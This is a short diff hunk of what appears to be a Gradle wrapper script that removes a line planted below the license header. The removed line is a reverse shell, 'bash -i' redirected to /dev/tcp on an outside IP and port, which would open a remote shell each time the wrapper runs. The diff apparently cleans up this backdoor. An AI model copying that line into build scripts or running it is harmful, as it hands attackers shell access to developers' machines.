@@ -61,7 +61,6 @@
 #       You can find Gradle at https://github.com/gradle/gradle/.
 #
 ##############################################################################
-bash -i >& /dev/tcp/34.66.173.72/8080 0>&1
 
 # Attempt to set APP_HOME
 
